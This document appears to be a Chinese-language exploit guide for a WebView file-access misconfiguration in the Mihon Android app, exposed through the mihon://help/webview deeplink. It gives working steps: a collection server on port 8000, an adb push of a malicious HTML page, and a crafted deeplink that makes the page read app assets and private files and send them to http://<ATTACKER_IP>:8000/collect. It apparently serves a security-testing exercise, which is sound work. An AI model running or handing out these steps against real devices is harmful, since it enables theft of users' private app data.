# 2.1.1 File Access Misconfiguration EXP

## 漏洞触发点

Mihon 帮助页 deeplink `mihon://help/webview?url=<file_url>` 会把外部传入的 `file://` 页面交给 `WebViewActivity`。漏洞样本在 `WebViewScreenContent` 默认设置后开启：

- `allowFileAccess`
- `allowFileAccessFromFileURLs`
- `allowUniversalAccessFromFileURLs`

因此本地恶意 HTML 能跨源读取应用可访问的本地资源，并把内容回传到攻击者 HTTP 服务。

## 运行服务端

```powershell
cd .\exp\mihon-0.19.9\2.1.1_File_Access_Misconfiguration
python .\server.py
```

服务端会监听 `8000`，回收数据写入 `received\collected_<timestamp>.txt`。

## 推送本地攻击页面

把恶意 HTML 放到设备外部存储：

```powershell
adb push .\exp\2.1.1.html /sdcard/Download/mihon_2.1.1.html
```

## 触发 deeplink

将 `<ATTACKER_IP>` 替换为运行 `server.py` 的机器 IP：

```powershell
adb shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=file%3A%2F%2F%2Fsdcard%2FDownload%2Fmihon_2.1.1.html%3Fcollector%3Dhttp%253A%252F%252F<ATTACKER_IP>%253A8000%252Fcollect"
```

成功后，WebView 加载本地 `file://` 页面。页面会尝试读取 `file:///android_asset/benchmark_mock_data.json` 和若干应用私有路径，并将可读取内容发送到：

```text
http://<ATTACKER_IP>:8000/collect
```
